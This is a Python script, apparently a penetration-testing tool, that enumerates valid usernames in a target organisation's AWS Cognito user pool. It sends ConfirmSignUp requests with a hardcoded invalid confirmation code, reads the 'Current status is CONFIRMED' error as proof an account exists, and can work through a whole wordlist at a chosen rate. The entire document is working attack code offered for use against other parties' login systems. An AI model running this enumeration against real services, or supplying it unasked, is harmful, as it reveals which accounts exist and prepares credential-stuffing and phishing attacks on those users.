###This script will take an username or wordlist and tests them against the AWS Cognito "ConfirmSignUp" API 
###An invalid "confirmation code" is hardcoded - you just need the wordlist or username to test, the target orgs clientID, and the related AWS region.
##TODO: Account for users who are not yet "CONFIRMED" but who are valid nonetheless.
##Limited research tells me there are a few documented Cognito User enum techniques - but it didn't seem like this API was on the list! Maybe I missed it tho, who know... ¯\_(ツ)_/¯



import requests
import time
import argparse

def send_request(username, client_id, AWSregion, confirmation_code="0"):
    url = f"https://cognito-idp.{AWSregion}.amazonaws.com/"
    headers = {
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": "AWSCognitoIdentityProviderService.ConfirmSignUp",
        "Cache-Control": "no-store",
        "X-Amz-User-Agent": "aws-amplify/6.0.27 auth/2 framework/1 Authenticator ui-react/6.1.6",
    }
    payload = {
        "Username": username,
        "ConfirmationCode": confirmation_code,
        "ClientId": client_id,
    }

    response = requests.post(url, headers=headers, json=payload)
    return response

def process_wordlist(wordlist, client_id, AWSregion, rate_limit):
    with open(wordlist, 'r') as f:
        for line in f:
            username = line.strip()
            if not username:
                continue
            print(f"Testing username: {username}")
            response = send_request(username, client_id, AWSregion)

            if "User cannot be confirmed. Current status is CONFIRMED" in response.text:
                print(f"[VALID] Username found: {username}")
            else:
                print(f"[INVALID] Username: {username}")

            time.sleep(rate_limit)

def main():
    parser = argparse.ArgumentParser(description="Cognito ConfirmSignUp user enumeration script.")
    parser.add_argument("-a", "--AWSregion", required=True, help="AWS Region.")
    parser.add_argument("-u", "--username", help="Single username to test.")
    parser.add_argument("-w", "--wordlist", help="Path to a wordlist of usernames.")
    parser.add_argument("-c", "--clientid", required=True, help="Cognito ClientId value.")
    parser.add_argument("-r", "--rate", type=float, default=1.0, help="Rate limit in seconds (default: 1 second).")
    args = parser.parse_args()

    if not args.username and not args.wordlist:
        print("Error: Either a username (-u) or a wordlist (-w) must be specified.")
        return

    if args.username:
        print(f"Testing single username: {args.username}")
        response = send_request(args.username, args.clientid, args.AWSregion)
        if "User cannot be confirmed. Current status is CONFIRMED" in response.text:
            print(f"[VALID] Username found: {args.username}")
        else:
            print(f"[INVALID] Username: {args.username}")

    if args.wordlist:
        print(f"Testing usernames from wordlist: {args.wordlist}")
        process_wordlist(args.wordlist, args.clientid, args.AWSregion, args.rate)

if __name__ == "__main__":
    main()
